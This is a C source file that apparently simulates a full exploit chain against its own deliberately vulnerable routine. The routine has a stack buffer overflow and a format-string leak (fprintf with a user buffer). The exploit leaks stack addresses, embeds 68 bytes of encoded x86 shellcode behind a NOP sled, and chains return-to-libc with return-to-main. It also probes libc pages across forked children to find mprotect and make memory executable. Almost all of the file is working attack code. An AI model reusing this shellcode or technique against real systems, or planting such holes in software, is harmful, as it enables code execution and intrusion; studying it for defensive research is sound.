/*
  This file contains the source code of a simulated attack process. In this 
  attack, we assume 2 pages are in the slot, available for read.
  - The simulated vulnerable program contains one stackoverflow vulnerability
    in "buf[810]" and one memeryleak vulnerability performed by "fprint".
  - The attack overflows the eip in the stack, and performs a double return
    attack, return-to-libc and then return-to-main. After the control flow 
	return from the libc, there should be 2	pages in the slot, one is the page
	contains the "main", another lies in libc memory area. Then, we search the
	1-page-memory read from libc to find if there is "mprotect".
*/
#include <stdio.h>
#include <wait.h>

const char recover[]="%x.%213$x.%218$x.%214$x";
const char MPROT[]="\x53\x8b\x54\x24\x10\x8b\x4c\x24\x0c\x8b\x5c\x24\x08\xb8\x7d\x00\x00\x00\x65\xff\x15\x10\x00\x00\x00\x5b\x3d\x01\xf0\xff\xff\x73\x01\xc3\xe8\x40\xfd\x03\x00\x81\xc1\xdd\x9f\x0b\x00\x8b\x89\x08\xff\xff\xff\x31\xd2\x29\xc2\x65\x03\x0d\x00\x00\x00\x00\x89\x11\x83\xc8\xff\xeb\xdc";
const unsigned int LMPROT = 69;
FILE *rf;
unsigned int probCount=0;

unsigned int getLibc()
{
  unsigned int addr;
  FILE *fd=fopen("libc","r");
  fscanf(fd,"%x",&addr);
  fclose(fd);
  return addr;
}

void storeLibc( unsigned int addr)
{
  FILE *fd=fopen("libc","w");
  fprintf(fd,"%x",addr);
  fclose(fd);
}

void buildpayload (unsigned int stage,unsigned int *mrecord)
{
    unsigned int libc_addr=getLibc();
    FILE *fd=fopen("command","r");
    unsigned char payload[1000];
    memset(payload,0,1000);
    unsigned int Padding = 200;
    unsigned int libc;
    unsigned int *gs=(unsigned int *)&payload[810];
    unsigned int *mprotect=(unsigned int *)&payload[814+12];
    unsigned int *shell_addr=(unsigned int *)&payload[818+12];
    unsigned int *arg_sa=(unsigned int *)&payload[822+12];
    unsigned int *arg_len=(unsigned int *)&payload[826+12];
    unsigned int *arg_flag=(unsigned int *)&payload[830+12];
    unsigned int mainRaddr;
    
    payload[0]='S';
    fscanf(fd,"%x.%x.%x.%x",shell_addr,&libc,&mainRaddr,gs);
    fclose(fd);
    (*shell_addr)++;
    (*arg_sa) = (*shell_addr)&0xfffff000;
    (*arg_len) = 0x01010101;
    (*arg_flag) = 7;
    if (libc_addr == 0x0)
        //libc_addr=libc-1734120;
        libc_addr=libc-1000000+0xd0000;
    else
	libc_addr++;

    storeLibc(libc_addr);
    (*mprotect) = libc_addr;
    unsigned char nop= '\x90';
    // ShellCode
    unsigned int len=68;
    unsigned char buf[] = 
    "\xda\xcd\xbb\x95\x0f\xae\xe6\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
    "\x0b\x31\x5d\x18\x83\xc5\x04\x03\x5d\x81\xed\x5b\x8c\xa2\xa9"
    "\x3a\x03\xd2\x21\x10\xc7\x93\x55\x02\x28\xd0\xf1\xd3\x5e\x39"
    "\x60\xbd\xf0\xcc\x87\x6f\xe5\xc8\x47\x90\xf5\xfa\x68\xc0\x82"
    "\x6c\x77\xb7\x3f\xf9\x96\xfa\x40";

    int i=0;
    for(;i<(809-Padding-len);i++)
      payload[i+1]=nop;
    for(i=0;i<len;i++)
      payload[i+810-Padding-len]=buf[i];
    for(i=0;i<Padding;i++)
      payload[i+810-Padding]=nop;

    unsigned int *tp;
    if(stage==1)
    { for(tp=shell_addr;tp!=(&payload[994]);tp++)
	// return addr to main
	*tp=mainRaddr;   }
     
    fd=fopen("command","wb");
    fwrite(payload,sizeof(char),1000,fd);
    fclose(fd);

    *mrecord = *mprotect;
}

int cProc(unsigned int stage, unsigned int *mrecord){
//int i;
   FILE *file;
    // Buffer Size = 810
    char buf[810];
    while(1)
    { file=fopen("command","r");
      fscanf(file,"%s",buf);
      if (buf[0]=='S')
      { fclose(file);
	file=fopen("command","rb");
	    // Overflow happens here
        fread(buf,sizeof(char),1000,file);
      }
      fclose(file);
      if (buf[0]!='S')
      {   // Memory Leak
	  file=fopen("command","w");
          fprintf(file,buf);
          fclose(file);
//scanf("%d",&i);

	  // Build Payload
	  buildpayload(stage,mrecord);
      }
      else
      // Exploit HERE!
      {   return 0; }
      }
}

int hasFunc(unsigned char *buf)
{
  int i;
  for(i=0;i<8192-LMPROT;i++)
    if(memcmp(&buf[i],MPROT,LMPROT)==0)
      return i;
  return -1;
}

int main (int argc, char *argv[])
{
    pid_t pid;
    storeLibc(0x0);
    while (1)
    {  
        pid = fork();
        
        if (pid == 0)	// Child Process
        {   // Child code
	   unsigned char M[4096];
	   unsigned int pmpage;
	   int i;

	   // Prob for mpage
	   cProc(1,&pmpage);

	   // pmpage copy to M
	   for(i=0;i<4096;i++)
	     M[i] = *((unsigned char *)((pmpage&0xfffff000)+i));

	   // restoreCommand;
           rf=fopen("command","w");
           fprintf(rf,"%s",recover);
           fclose(rf);

	   // find mprotect in M
	   int moffset;
	   moffset=hasFunc(M);
	   pmpage = getLibc();
	   if(moffset!=-1)
	   { storeLibc((pmpage&0xfffff000)+moffset-1);
	     cProc(2,&pmpage);
	     return 0;  }
	   else
	   { storeLibc(pmpage+0x1000);
	     return 0;  }
        }
        else if (pid > 0)	// Parent Process
        {
            printf("Child Created. Pid = %d\n Libc prob: %x\n Count: %x\n",pid,getLibc(),probCount++);
            waitpid(pid,NULL,0);
            rf=fopen("command","w");
            fprintf(rf,"%s",recover);
            fclose(rf);
            continue;
        }
        else		// Failed
        {   printf("Fork Failed! \n");
            return 0;
        }
    }
}
